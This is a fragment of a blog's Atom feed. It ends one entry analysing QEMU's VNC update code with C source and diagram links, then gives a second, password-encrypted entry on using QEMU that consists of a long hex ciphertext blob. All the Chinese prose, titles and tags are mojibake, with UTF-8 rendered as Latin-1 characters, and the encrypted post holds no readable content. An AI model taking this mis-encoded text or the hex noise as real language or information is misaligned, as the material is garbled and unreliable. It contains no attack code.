class="keyword">if</span> (!x &amp;&amp; x2 == width / VNC_DIRTY_PIXELS_PER_BIT) &#123;</span><br><span class="line">            y += h;</span><br><span class="line">            <span class="keyword">if</span> (y == height) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vs-&gt;job_update = vs-&gt;update;</span><br><span class="line">    vs-&gt;update = VNC_STATE_UPDATE_NONE;</span><br><span class="line">    vnc_job_push(job);  <span class="comment">// æŒ‚è½½åˆ°å…¨å±€ queue ä¸Š</span></span><br><span class="line">    vs-&gt;has_dirty = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è‡³æ­¤ï¼ŒQemu ä¸­ VNC çš„å·¥ä½œæµç¨‹åŸºæœ¬åˆ†æå®Œæ¯•</p><h1 id="0xFF-æ€»è§ˆ"><a href="#0xFF-æ€»è§ˆ" class="headerlink" title="0xFF.æ€»è§ˆ"></a>0xFF.æ€»è§ˆ</h1><p>æœ€åè®©æˆ‘ä»¬é‡æ–°çœ‹ä¸€ä¸‹ Qemu VNC çš„åŸºæœ¬æ¶æ„ï¼Œè¿™é‡Œå†æ”¾ä¸€å¼ ä»<a href="https://zhuanlan.zhihu.com/p/69568087">çŸ¥ä¹</a>ä¸Šå·æ¥çš„ä¸€ä¸ª Qemu VNC çš„åŸºæœ¬æ¶æ„å›¾ï¼š</p><p><img src="https://s2.loli.net/2022/07/21/7BcC1jzxESl3ZWt.png" alt="image.png"></p><p>åœ¨ Qemu ä¸­å†…éƒ¨çš„æ˜¾ç¤ºç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2022/07/20/FUkehDzTocbtu4O.png" alt="image.png"></p><p>æœ€ç»ˆçš„æ›´æ–°è°ƒç”¨é“¾è·¯åˆ™å¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2022/07/20/TVEaSGf7MgvjCO4.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;vncï¼ŒğŸ•éƒ½ä¸ç”¨&lt;/p&gt;</summary>
    
    
    
    <category term="VIRTUALIZATION" scheme="http://blog.arttnba3.cn/categories/VIRTUALIZATION/"/>
    
    
    <category term="å­¦ä¹ æœ­è®°" scheme="http://blog.arttnba3.cn/tags/%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/"/>
    
    <category term="Qemu" scheme="http://blog.arttnba3.cn/tags/Qemu/"/>
    
    <category term="è™šæ‹ŸåŒ–" scheme="http://blog.arttnba3.cn/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
    <category term="VNC" scheme="http://blog.arttnba3.cn/tags/VNC/"/>
    
  </entry>
  
  <entry>
    <title>ã€VIRTUALIZATION.0x00ã€‘Qemu - Iï¼šQemu ç®€æ˜“é£Ÿç”¨æŒ‡å—</title>
    <link href="http://blog.arttnba3.cn/2022/07/15/VIRTUALIZATION-0X00-QEMU-PART-I/"/>
    <id>http://blog.arttnba3.cn/2022/07/15/VIRTUALIZATION-0X00-QEMU-PART-I/</id>
    <published>2022-07-15T08:45:17.000Z</published>
    <updated>2022-07-21T17:37:15.985Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="é“¾æ¥ï¼šhttps://pan.baidu.com/s/1glFilTF8ua6hI-bklKgJXw æå–ç ï¼šcth0" data-whm="è¿˜è¯·ä¸è¦åšä¸€äº›å¥‡å¥‡æ€ªæ€ªçš„äº‹æƒ…ï¼">  <script id="hbeData" type="hbeData" data-hmacdigest="d814ee193798cdebb55f0c008d5cf8bb4eac92001804f3c0545976adc76db908">eef143a3a3e51e2ee0b1e9c84de8c53cf08680c94d7c712f9ae2f765a245a0cd63f7a814e07e52772f52fcd435286c2c426d6e55bfa6ce8f9b93ba4a268ed138e484a058e5457e40f7f8399d224b095c25139ff37e99980b5e79c04f4ae1b28824f289e1503535137dba6dcf82bd3da7274f84035e3586d971a96edf7601ecf75ac93249484238da37399f53a52791c2d4f7ce1d114766444ac84dbeb3324bf587cb297c1da9f4914d41996bcc8cac4cdbd114a9cb43ea8cd65dafc7159603f5b122e654a0e8ade91af92bf9b6fec304305bc1f4c2144ebe602304a733214ed80805b325f41bcd95fb1f58071dbd3f30006522d001fd75ad97dfc8218a6135787de82721f525ff36242e447d032f729b99c072950a01f3cea671b32b5043bd81a4703cbb1dd8eff3c950ba4b7b4ed10dec58f2c1a8561912e69b9b64950d46a6fdb5820219803210fd270e078d272eff46941ac94b9b398258a86589182175c2da3b44cf0e5a17096e5d62d9972074de61386f425b9d1967629046093989bb6d528d8790ae64d5ce980edb72923e0bbfb6b0f94fbbd457e944d83fb8bdbbf3b26833b04233aead6ed635feb51ec46ce01c327c05d33ac34d8db8e2f1fb0241badebc3d189aeb3c80ab80760df361f9ed44f219aeaede53bbaa82f947ea51c020d1d31a2243f12c82af94a5a9c5603758339691b24bd893e1c0b1a845aa6ca405116ccbe8590df3e7e65bdadc9418ecc201be719d5d71524cc44efe892a69cc1bc9f51483f4f984767515bc5d15d6ddc4f1278111d6f95d88e29cc88f1bb74108a6a4b491d95a8ff25b2ecd65dfb3b8a4a4b48ef3b296e9f102f9982b45b059f6d72d164cfd091883170abf96cfa9291d6c608d58cfcdd91141b2c9d43c2902ce2fd483e5218b9098244d0892f59ce296b260f21cda051be76ed327d30c77236a86a9192ef26537bec7317f4d4aabc957c9389248f6c5d903288fa0c84d227293d2dbcf7eccf1d0ffefbff851512cb2ff1d974c452ea6c683c35542d15281608d348ed34dd6727e5054a5b5a687df22b349bb0dab97ad8fc054a13b9a8f8bad88c1223e682794ee271b0b7e1ecbd9badeee59a31c14c3d8bc1c91e1c36a232e0e362dd318f4b5a565dae31cd58acd20abda05c27d2d446fd7c3da2f98a426ed7fc23ee7752845a9502fb4a11be1fb4b50cc2c492e80e052dd822d2f3c5207f3a4aa8199e6c364d37c86f342a0af92c28bb481c7074cf654ba3382e0076969cbd74d332673b3b736257378c25612af11e80f61cb0a76c9fe7b57067e8f0d3b5db485ff2e34ebdde71372443d4ef146b4cad227551045a7f6972a745e2fe625d24647673f5b692dabdf00e4eea13f98544bdf249628376fbda2339a58df12c586249ff7af72fb5611b0b097cd96db9eb1683e35f22a6febac1448d7ac19210b0294599e654b7e16cc97f753f71e5adb9013d95b08f5d7a93e5267a048254586540965aa8e7353eca5da38bbe94eb474811cb1998c9766d4ff1fdbdad56f32c957c1f5346a481c5122571240cc624aca9993078e1e6dfd2b9be8f4da51604b6011b2ee89108b36b6947e00c3b33c0cf650af787696dc49632201cc589f72861a07416d8f5ceb2977fedcc0110a0966d4482b2d2b23dfe666deb290593dcf6e6da7ace69083defe61e4f96bf780bf4d6f7e038f08be86ddf133965a76bf262964c8eb590948ef30cc2abc21e2b7239fbd29826c34b86ae13cc707003a8f2e7a6c38a68e25acbec05310a77f075424ba24af8ff205d898d4a7aca6f12a280cea8f973b59b7dc8ca81237bd99d46d35b83a518f2b8e258e2f2f313db09246cf49a0b7850950304031d490aa4a79560329185bfa39f9782d99416bccf53035057725156b41d44587c5882809c049a9ff70933b33d3cc4740ccd3f0a6f91f0592d88ca2a8694f7cf3e1f5ebd0981e6692efe42c46d93956422aa287b83af363c75ef85e9388a8236572c8775e052255bf521ece127b8e882feed6472ec0a7ed64ec6c01b0087d2cc56a0939a7f9dfacf6feaf46fcebf45ca28ea8eecdaefeed6f5afe24ab2197a4168b097be485c6acfa39127541d7860dbdee9726a6ae2742b582104aa44d226cf0c0dcb2106dd519bb57e65ef8b92c64904d5cb8a5c98f2ed29a8c7f093db2940809e0cf595c84b0b0797c01cb53503be16334002d4128b3bda84cb08e0fbcb76defbe2c1f8cbca8eed454dac51b879285e87bd453cee4075eba8a9fa02bbbdd14986900a58f9bd0847a2ff65b6302f5f2f4629984b68296217d16137c2c243338e3031a820a920fe68bb2be16823d81dbbacbd565a690150733bcb4d243eac1d108b3776d7efb9acc817c79608892eca8c9460a8de06ba218f3fdc4b63527a15aa584851226401111e2574875b8ef854dad304428de29b3acc806e3079e4c11d64fd466d30e679e1ae1c6176c65627a4c1ae7105497d154e52516443774e2db81f9e94d7d3e1dd6705852b0ce153b78b01dfa6410a6b62a0467a751429f6c821048cdb8f04b73879636082cb099a684b7bd855ee7b928cda7f364a0649963b06ac19638eaa7f2a51d07e74d7552878ce709c538a8cb62839610e8f62a8091f27f71f7a35ef4d37446193a26e1bea277988dcad6cfec5c37fc504130a4c05ca7caf63c353712689d23419cb22979ebe80f88797b6a203ac2c6fbc8960d8d8124a7b21fb8c6f348c7f186358d5c073f105f5d023f46971723270e1f6fc428d34cc05d1434ae10f4471d8dde137aac5cd7c2223553677e1797672a8c3b6e6baeb334e0203c29f26d249e45ce2231bdc79778d21557ba72af48879896d6cde2b50484ce2eed657472c25f0f5e8dbbf409d79f580fd6b5036b3a44a5f90e21cc5348de058ab729a033c054aacd5779c4ea29e6504988bf2ed4614b2e716fbdf35785d30ed471339b45f3338cf7d679a018bbd80bfe9469d9cb387803d054a339727c49ccf18290b1f6dbda8e35d72f30b2510b7c4565b5a42f471416c01f86e8a361f3dfbcc248cbbca8205a849a9fdf61122de71ec661ea2535d8a929d504c4f501eaa5a238774e26ed6f243bc7e695c35601c76a49dd451a8c85f283d523ef26de1ed69fa22229ea4f6d5aa9ef91080918190e6a7ca97dd712e1337afad69a7f8492b41cc99cffd0c0c65b5c705a202b236f9c97a92e64cd936f7482e50db911b00f612357f97ac4f27189e2935c8558182721726fe87a4790646b5b61ef0cd52c1b22dc0f91515a37f851f5464083cb9db64b65e5f0592d0a1d6b14f4836e9cea8781291700b8793d0413c72e0aa60d09db8c353bde7c7d1fd357595fd648f4db05af47f6cd3c3aa2f9942d5115c7d3984de48ef23d388171926f7a9a0c2b62644eabb68d98d794902b00f0a7a3b2d63f45d695fc9a79d8af143cd678544e81b8ce29e18f660ced6b6d21ccb3d40d8d97d950cb8219276fdccc2343647abe7fbecd5c04163f835a6e6543ab55afbfd62f462937c0c9684ff1efefe61c1563a613464c72a909484ea3222ae8891289836a7a336c5b5cfcc30b53ece3f0a7930ea2a02d03884538b33df943a4ed7782cfeccef9ae6257021189b464f94d2bea0b16e446e84f3a7daec626da271a790a356266a8014253bbb1267ab99387d5a0c409c4c4283d979d7737b2b941c346b96a32310ae5b16a71677dbbd460816cb06fdf3a0b24995a254d157da952b5c7f2cf133071f691492a653557c36921c780d12a4aeab4170f1d1a0294dd1cbdf135457e49ba0ab493f8328577ea1a83dffe20675959e6c420a2e45e63ed440ea2cccfe2afe2211ea92e5fa791e5adfb625eb7e42299e5ecc096df2354b2a3399c25bffc3c51f25c6059480492e78de26cbb2ec8d18e70ccc2ed6ddb67cb3d03bb38a3182452c16bcf6535ba2905ef774ea78b9ba7d9c9e3ae37e495da5129f106cbfe9246cd5fe6551f38775173b8490282894a3912f68d2e5d2d56aedcdd25bbe85617056f8858712f9c04dd80fba1e7f0567f656cbdae2d08d144d3cec22a34c924ad9f9469226d75420f7667becd851547933ac7098d2cc0c8dc99076045e3fd8a58ca042b032ad3ce30fc944cef27a2b220011f2ca837dfea44c6b7299ec53029518b9ad120911dabeeb2015de1ff031e9033a32ce57936b3ea9e6ef08f232f15a036ef321392036ced6b4b107418627a0320a0ed13a85684ad12ad724125d19c6a95799436075551468207501c175d8c1c639b87d42250ce1ded5d32efcd5b9aa59eeebd0a0dcd9c86f4afff29253c341b0372bb6f07437d9ea7dff60e7666439f51a293093be4fa76cf184c3f57aaad40485bdac243e5ce31f5f2e8fd5ac811ede8492790c312516adfef614d0be1233bcbcd81c627bbffd35f8bd5dfad69c6410009ca8f397fde6725a8bfb398f2632537e4c56d5774f3078c028248ec55dcbabe28ffe062cccf76cd581434637d3079910ecd72c6134f13bbfbf59843b59550bcb39c629195a74b48ccfe70214fa6826e29cc50630014da4f556dc60b61d92b2a93e444481e67a67ca04f9b737c9a3678ac8aef1fa59ffe613f2662198299aec0cb96d34d882d49b29e8c3d3ba2ee036e2720830fc29af6ac7760f88d5b48df1b0556e38ad58962b9c988aa51c28dc76c2c1a699278b41f0a3dec10308a2425324d79aacca3f7ddbbb19998b4622ff0c8c382d1ca3226206bada38a22fa3de826a49cb2b00fa8a1c93e25237dfece51d0e6a202931f4131e2f4a7ef45ed9381b435e4958b774e45a0293845e273f316835837fbf748b3cca21fa0c44b4044f2e94ef928dcbe154711aac75cccb5f43897fd15f056a45050bf2000407f308039711ccfada77146da02dbafe6dfa422dcbb2a329af07e2234cc68df3ce891ab4d4f48d7086e7c3939c50b4617e9fec72541ba089967a7c7718dcb0b583ea274641f385fcd1d71a0b3fc79997b320b89f09f2f3e39f59396049f5d5a337c3c3ebad16bb6dc08ef2e863aca809b78f905f1fd0e22c17599ea1db3cfd31ba8f7c1fbc8af54ee7629a109c31a38863a1a352b59bb2dbd9152d02a266faa2a9c616029f821ed1774df20b55dd0167260fec9e580cf131d08d48dc954e60a1908d7d49c5486a4b150dd430561b52f45116d8a8a77db598627804397a47c398ce25926c3846cff31a430a301a17aac599fc1c616b17ddb78865674ed60949fc471f27e61dbf8250c8bcccbfd8435068eb1c9452422136a81946492e31d48e48fa8783f290af618ecf1e0bb9f723e43bfeceafefc5c08bb7d58076803851d5bb52b6037ab2b3f70ef093e5efe81a85423ce3b7960eb8767f8c22628dfa102d6b1130dd448949a752b973f81cd0f6fef6acc27579e49f050733300d432d915a28060b9f5a3e810fa94f6de80575dcb3fbc8f374d06a52d8dc8b1806a1bdc7050645ce80f02904263b5bd072585efa8d2362fd7dba4957f0234e6507a24e93b2ce7072327d2f22f5a5edf8c55138f62ef0bf169892cd515091d6bf7d6393cdc7d78cff1fbbbd8d574c9b0f123be0c39ee41c464f764d5d8a678bc3a4b9593e2ef2b8c73d6695c0f8d7dc2716a4e65307ccec18f99dfc0b3b8274795fb1909c4cb44dd7a8da9cbdc5730a3d0bc8615a137e215b7bfd893bc53744d4c6a802f0a5a6da2ef6b10ae56a20567d70b471aef578c41da165e004933d508aee01a039394fed14c097910124b35ec5df26be6fe530bcca8692add191100a9647865519629cde941b8111e91f5122fd41142597436cc215494357cc9e44cbac86e84ed98028f907665693b3e90c24b10193b30f40c056e81d069afd17e3632d3fc38182671e2e2f3013a9d2783acb3e215c68a034e30bc9356d27d964ddfdee945f6b64abc4d8a7a6de30ae6ddde19ac0bf995bf3f0779be7b35005948da5243ce89663115319b4bfbaf11bb08713135fbe24bdb48fe294eb456bf9b6f2971d2475a9405e65f20c4ee7834fdf391cf7fd3452610103d9ea3ce0599b9b4033a421a38d8397c740ac080f4fcad442b7781afa0911a14afd642e2572895c9467e7ddbb9f6b03a46c4be588bf93f1121dc17c8997cdc0286d9061f0a65790ebd9aec193c395bdf7fa8173a11f3fdb1249f2dabdd16b375ecda2f4aa08f7311f66ecac39b2e30e7dde2c8064d8246eb804bf2805fc3c587c4079205603fe73fbf10ede87b11dc9b708d58073cfc8d243a18358599397b3ff1837dfdf9eb305a8f52cd532bc78510ab2a9a5a542fb5dbea809c294c79d8612b2aa4a2e076218f0743f5d01b7555fb570f1c20fba9245bc99cd2e16ffb17d7562085a1874ee8ee981c449e5f3eb32f5ceb2c641a924f038dd3f9bdca63e6a558b5e990c928d5661beb32f800dda12976ecf8c3ec540f0b0f2413ed62f1a9dcf78f487a5ff9ff1356455b35ad5ac4d018211639d3c0754ce649fa08f47b0aba5f9f35eadbec2eb965af3e07cd71a4d1027dae646be9fff0a8e7e7a5e6e07a562f3cf589d286eab609f275d1c6b0720f5ce4955a18277d525b7bdccdb7693198c934a14d0d72ea22101603d76b737f0497aad41dfeaa69fc853f359b51d2aef44695a910813b027c39c7809168b841452ea26ae49f99b4e32f3f274f80f2acf9e28098981673e2b9078c4adb441c72f8bea5af00bf016038dd87255ed7f96c50351bf9e020cf103783dc0ce38b130511681faeeb9465325a46fd9a5077e74773fb8691f18bc3a594adb88bef16ea264b600fe907244bf0a62fe04b766642277c1959ced70108daaf3b7fcf24b944c2bb0c8104a700168a2d5e90ff8b43005de6292f4931183b333768a6038925a3a6b65ec1c95895888716425a54039fcc66b9b88152ab3fa3c94fa4aaf08abb9656295a6fa4d8a8f6d3439538b2a16a4b89bf25bed15409ca5211061c0639a7151e49b889785eb911f9a100992c7bdceea051d7cec89cd2e75818f8db77c3afa7605464c54201f6dc854022366f18c0b0123052b49cc147e4a4189b2e501b6097fa694b24baaf07dc7a02edeb37ceccf13dee748d1baabdbbc64845559c8f5a3c945db7bf01f75f35d6354d5e85ce7d576a540aa8f2f6be49100aa4a0d31df78345ce2ada7f9d9989ec7d4a384f82d0d8b71ca9705d56abe463071e933acaf29c70b4cb07106f9d865712b89f63dc26c47f946622b962d71538fd5531e677d56fd1f210cad6aa7f4379a5c75939b3d1f2cc52673c0c4000fed0cac3f0a91979041769be88040a36aab59732d1c5adaefe28f9165f07d245ae7058e618a043f184a03642b3d12ce0e2a6dc53759a84d90c5ae39d5a98938e4a7950c30a0899c95fec1bef6f68c12c316f86173bd7818b577fbebd0e270febd8e68cd14a594db663ff4ca34e1e720db320ed8013e58868194fbfa44ea9c1d0caff260bb07a2756cc82e4d1483f72e3c0c6415b907c2413d3f6575f5e9b45d6a0b8c430ed62926fb2047f0224f9421f3e6a4edb9a1bbd8010bd668fdb249d2b315f35a2f02df15a9b11c1d3e04f1e667fe28f42a70a981fa9fd09575d24ec5cb6fb735ef7aed1725ffe5bcb82524719294d4e2ed3e57f086ee47c94f019418329a2c7420c1f01b49ec994711f0800fe4c267897b6a8b510a8a49873680b5259fb3934002f902f682f49f8612fb2bf3eb08552943139263262c284485144881d80d7df2f3fa70bd906c7986e336f930a429a3f153b7b25bb7db02ff7b9b27039c875e5d6f4359227cd22d36276457153d9da92e9aa7e8b878fd818ebe16412aa85d8e4411bf94fd2d0ada363afddfd006d14562ded6843bf4262f7abab0713d5107c56882e43efaeead54f02585683fcfe9e0cde54fc76a2478fbea945217f5fac950ee513a3907895d446d7bc15d80fd3bc3e75135e4c3f655d4bf373073bda5df533b6d33f5c46f2b4ddbbb2f8ee854796959828b58d5f850d7dd1e46960d7bae5c59e7bad3da2a69ff31622167766733df2b8b5899b12523667a39a93e815ca6f26384f08b68e4174ec6a682aedf069ce56f9cf5e418cf520979a5d0c4fb4513d8c6790cb3d4da2cb2416c8924e0c32a0d3e09d92bf94907935acbc552e44d95105d4277f32d297a47ed4005db4ff4d8865e9544eefc303fa5452c834df5334c369682ab258ff6b02de27cda872a553aa2a0f99f480682fdb1b02dbd5a3b5b12568178362c289abd95f298be16a6ff729653c7a0f085cc7057943b4ef3f9070d8e0786b0a2db10a2b94968b2667bbe779d78b13249e48483de997cd4fbaec94431c2cebce625d7a36dd68bccefe778693323df0aaea23e0a808a9e5754ee2bd2f0da7a97ffa8129b74d33b1f5b2813025811dc3ccfd4986c30fd4f7832aca113d69fe69a6e4563e871def7a21b19c85212aeb723226fff65cca7ddea173e68a5db965ce0b1c3039a52c4038da721bb32574c08bf5eb1d34cc810af6795cb32d260ca39805ebd91f6ab9f2be00d9b578d5d6f971e47cb63020abf8d6fb023011ab23581180eab8ed5cfdb2da54e73443f06d064fb78b1c9a184e0eca118a3276279a8aef765a0f01295479b1cb970e2242706c0076853ffd61375c34962138d8b2e80792767e500f0f175461650919459cf53c676d42e937de31beefabc707d165435838f447c2a8b876881e63dc449257976a17e6f4fde88b9c5a9011ecf28dc8dc63a74a831bae3bec59cd78afdc67adfb9c324e4bee6b0b844ea123825c75250d62003322be3894350c32e4f97f8e79f6a7860163c00a48fbcb339cc13f935a932bbdf50f7ebdd53e69849237663a1ee34797c9bc7d0963827b2f21812c07990a8aa0e16d3c37d8bc5b05f7c601dc288fedd2c01b0ff2d8bb96b3b8ba2e95d7f33181d946f285f23a67d2b46f431cd563cdf03734d6a4d189ca40b3df40b434ec6d34f50222b3d4604327f179ffa2f73fff4506c6520342520de148cac1365386d18cfe99b3ea7a951544b53768a8d170e57acaf1d70c380687b0fe5eceb2d1165e3b2aaaa505679b720a071afe78df82524b0975217fd53a67107d25fec48cc5e548686a0ae56a679e2f266c10793eb652f61db1c2ca88ab39093ffe721d9f7e2287ddcd8e7a404b84f0750e8a1cae935e9415a509d496db86c6728e4d700e210bfaf48b49c7e5a6f6e839768fb7557e29ab460942a8320bab1380360cd3aa7862dec220fa9a0e9baf2fc8a47a4a648f898c00ebcbc433d989fc47afe89b39dae79dc962af0440dcc6c1a52cf827fbd152404520aa382777f5f65075817ef67767f91ae767b061c403eaae3d1b0a2959e5584bf2ba60ad89dfe05d3fd1833810b899d817ea378e45bd80a9cd3b795a6bafc483698394a4dc4cab3bcfcb721a8dbada1cf1dc78e27438ae7fcd1aaf9696463d65feee9946c70aa4900f1cef0621a7f592e9a44254375514e8fdc01510877b12e936ec8c852efa01c0a14690fe6ae78acf73cb46ff416fde93d06789b8fe63beca20c35329023fa3f79d5b84439065da083b6729b6879bb13911f791817d78f131e4950ece2f152d1ef87648aaa40ef2c5277dcb2a7cd670b407dc65250f1322986383c395380f9ab54e09473ad22b8d13e0f03abf922477c8e4fe23e54d7a77c7298eb3d2f61d89b558b3d8fcff0ea7b109c261eebba27211cb1ab589f89b856369e8e538b41403cc5b1c950f9bc8913252fa461d60eb1106b611b593ce8875ef9f0ad84b4e13d5117f88398cfb3fad0bf162c33eb1549b2fd7c645c1cb81e7705e3df2b3f4457060404d35d1ce59a9dc3a437b0505caa8142963c5c039de4776a8c3b3403af0e960153c2e62f8ed8889876ce6f6109222745dfacd86ca7856187f41c80280c67d932b8e590433b737d92589108a7037d4a8be7d6e78879f99ee71d6b066548275d512b7e53e24f4688404d15355e3cccc756f92f577d46d9c41e6040b2ea197b00c79987d674372db4c8bb9296f41085df11a85d4c63856ac944d4cdf088b050c303c527d1bd668dafc7b0188a4cdd1ebc0b32fc99cb23da29be1e6358fb5f74cb10e6e155cb2ff3e3008a7e1d30ec7f5c4963edcf01b569609274b3d34471eebd5fe179efc21497c0809dcbaecaf762bf620fdad5233421d7f632d3c9417f1f270941e5fb4bde8e51954feaeb8b7c3fedd96d63b0ab2aec6aca2319dc0f6d791cad173caef128c070f9f5c9c8397f8672c1fbf9f049ca479139c632978bafdd3facdae85bfee1d02cd3b4053ff90dd65c70c2ac36292d9ec3ae6e56ea678b0a29d5d583a06feaa0d6f707f8d5cdb4e31593e2a026edae0336a07398d2e54d98b024e9eadbd167300c9e332dd9d695495144e646e8482089857b79b5d956231a8f2419caa584964337c8a6b5accee5a3b9f6b11074961dc3629a0ba4d294207ab8edd74b7e801bd3f6a8c23a6f97b9f4cd38431ef9d97bc9e8e802a7e204753010a08d035c9de89acfa75803948758f93af0d788513c6dac8f29561580c30db0ed45e266b559cf60bb83b9d4a7617bffee2fe02162453e381f6e7a8ef6ab0e8c55bf8ef758d880e69c97c59496f1f5ed3e3a1651ad97c07c05806032a5fa9e88c7945c5a7ce69bdb8d5330274032bb3de00e8123ef42c56279ee57acef4c1b5d65f331a860c6017a06fa6c9bcb5127667dafc50b4a7d4329485bfbf6a3417e506ada7f5d66e0c0ff19ab76c659271e52d7256545b88681f73e4f8a8b5ca39d98ebed7a80853aa89e022258b039c77b3a3932334fe52227fec855ccf55a38eb22af577758d66e86749283585f4f8409b7544f8efa10387cd6e33903e7365bb03d9159afb00e13f513ae261e03aa08dfb192c749e32c92bdfdccb65d66597f9db83e7f8d22ee166d0e143c140546486fe66bcfef6779831962e42c9e127361c8e2da9d329bf87d99e61b79ac71a3532f5e083d51ef5a03bd0f5b561f67e9edbfa0f6c4ed9945cab07f631e1048fa118176b796b5b1fd2fd7fc291521ef02d6dbdfac5cccf9fa854b33b7718b5740e297fd340e20e191d8247692694454dbf5c51bc6dff3d44a26c286aff620fa0068024cbef0e106635335551600a9e587b0bf013fe8da6d2e63be336b651992230acf9411f83d9b363733fd01b2845dcef73781d7ecdf0d6f9130393f920e45d3d364b07a5377ca17d4ebbb9dc971893a5cc452c22368ae4504fc1955e97f1afd1d7b56190abc25a7a96d8e8b911a0104cdbcfa49ea8a7a935376026ed71f4ee508c71198cff43dd32eed29af0e6f0b53527c0cda98a21b70b0772bcb5927ef4e20adc2e39af540e5488808e91e6818d401388bc75798dc10e048f2d36c115833622e9fb42740944c33ad1372997a91149074d55a9c6b8c4a611d8d2d6fbbc795ec0d142da6aa1b38297733175fdeda92f93290c88df8e0469ba95a31b95ff5409ac483432a8ce64847db6c044154af5ad0f9bb89ca81e17425869d57599ea642ffe5de009ebf104397ac9da942d8457cd64673a7c0528795781634b2478f747d5469b80c70c3d8d0d979ecc29f63decf35a87f229699b6352da2604ec3eb08fde0265c03b20bfe161d06190e825e26deef645a392f413f7146bc834e0dc67bb1b6fe9433d1f60fcc054da609833f353ab194e16680402c2d82c7b683ff1da78ade9704fa93108317851266b5bc86b663b0bb0091b19d6f24f36096648d95fe701626300b8090e3a23e766a961006c2a4f2cdc81c7d0425d247fe2afa4a80affa5f416367dfdc4f234aa8d891832497c7c24862a9c7c5145e12672e71888ca10a936cb66a32881e9c0c4b614c78e0e7640c71ce558831459b4626e55ec2c8873ada9da32da3a9f06e9f2fffcd4aadde0d24a0d638cef5855697779e7efc52eae4484a65b0cc8aaafa74d030cf6c729de95db7776f62a42359dc19acdfb6a0199ff5a59c4fd90e9bc5f2f3157ccb601f819417613845a8c536a765d82d122ca5927dc312959b33411184cd2ce2069a6b90d236d30246299bfe217ea1992426429294802daf19c8ec9376b0257b1f23f414e22869c0a038f8c92e1bf778540c52ea0b63c032d33688eb0fc8e3dd4a4b483bddf168c8239e9d717e604acc76f9409377fd3b818a594b98b06627d45d1d5b40bdb47bd5a49617955319e2e8263efb6c0cd0be024ee8d097a01f6cf629d079d0dd9819a045a13e23dc5bf8305531d54a4e201ecd7ddb32c0ec9bb9f40f4aa75d22559cbc4507a4d46423015a7d9ee21fb05700d55cbc1b3ff4c0d78ff3170c99965ea75aae37868d2ca426aecc2498d6c105dcab848058a02fb4fe0eb48d6a2d264f89c118180828588d713fe6831aff2b566f625d57cf604fe6240f7e167b7f617124a50d8919e358b8f4bbfa17ab4958e3900e7c7988554884b74a83b6b6d0d229154c6f282b895e27ca157cbd7a7dea23e26ab2b0354f22de873fb082d78838f3a671a646ed6fb1f09649c4cdb6f4d45e4a6a41f984e1bc3f2bc166c26f536ad8c17db33c1a403b103fd163007440036d6562ec4fe6f14ced240da2f97d5197995b6a1d7d163cbed5a54b80af746219e895e86998ad65e748eb4583b0a3e85581938ed4fdc65adb8e49ea1bad8dc7fe2266ce8f50fe9f7170cd0e8d3a20ffada382bc35c984e470f16fc3e627bf8e820c32744f745113f7aeb461f4b198b03ea923b54f8bd4407b08237e77eccb8f9f689ff944f8a9d3a8470b14486cb588287f346af17c8efd45d2f68e5e5225b741a4c6e1baab6372ffaef58799e0e456e57fccc59794e214aae97ea4869e61477fc9b14f5ffbdb387123256149e17b4b28a2536a7f973dc317a910e58b710a0a543e5118b6d48b2e8132a83477298fa7b1d485f954a34114fac529525c3c5c28a367acce7ff67e2409f2822213597a71b28586aed26b845a6ccfb14faa0777e73532f20fa3386872645b3b09215102ac76fe54a31699dec03a7457e7926d2bb07e1d923649697c845be79a1bf4daff630b6e06a2a159a158fbf750dfb877ed1cff2fcc5ce1bcd5adbc4b7754bcad85623023ac532229f47432fd0572bd66fd57682621f58255ff26eda348d7fbffb102bc1987339694e9dad193228b3d1c8de08fc95741fd599908c736201f922278c3be3e7ecb1f5c26efd079374a7c1be611447a2dcf13f3c920b0f7b10d4a784966457b6dcbc31a0a1ca07b175d02ec94fcb073416ea78e47463ede5ae5216fc92c6f4b958d342887b26f9af72e1fa66c589d897bbb2a7b6546458198281fc64f7c72eb0455eb70b7ef61a25bbbf5dd2aa8a50c1b7a98f0046a3cf03ebe8868c487abbcaec1dbbd2fb82dc235f5764a6bdc892bc40125f9fcd3264f31b99514750863c308661407958114073020ab8ad8d63afd93b0dde23d0dfeb02bc31f9a6ef7caa9ed788daafc7535edc80ec00fa6784c1d11d116845207fb914ec2ded0a98056dabed414f2e177903b161d2a865fa79d6da3c0630d0808700e5e1b0dba670b0c4625e1045106594b48798604d9b7db9fdc9a29c69e7911d0470e6a98702e9bedc2a62d54d36e05d7941cd22ca90b2e6db61486692da63755eae0f69102d5433cebf3ea54af15b7c1d6251572d414e7de2ed3740af3c61baec5f8fc44cb5a8d0f81198c3d4c1b4afe5415f63d154dc7ad05907445c3820481cdbf9fb8e568389ddc78c0de7ec3feaaed184dbe06eaa8b5b9254cf08effd33d2870bc4acab17207072f2e09b12358160129a9d2b2c00751b1ef1b83c7d7dd9cc82446dc3b0c2670f5254ca37c0d9bd13311704b530571480633fdb5cba8d78d5a82ffb625e4c2316b7256d65942487cf4255504a387e9d41c3c35d0a5e6974640dd14c6558f2cd727b4f2e34eb800069a4a343bf42ed88ea67da0bf19e027f84b16182819eddd1a80d6001e4a0fd97e7797438f51089874d44da303864b4af58497aecb7ba24591262fc837cdc5efcd82e4390244615475cc931c06652363b82950ad66526f3021ea4c71e38baaa7bb8247e87eecdd095261b93627e1e1222f9d428d7ae83ea5c3b1bef7f8c47314e7b5c598829a52f97dda96cb8de434e24428c507954e7b9074edfc1cb0e1e15159ecb20df0bd7461ef7bd9adc581ce263175f70014367e3257c541396ca6a1c818e15a550d06bb3870b9b2de019b2f309785a2ce6216cfc63748bff7a86f93d166ac2f1ba4b9c6d88eb6f5d165606227af413f01ebc40b669f581ae888f47c8d419046b9131f28c62e09633b1474805695ab71cca9613e9fff69be04db5baa808f41c7a5e76721a6c172411b01f1dc5c0b32cf7908a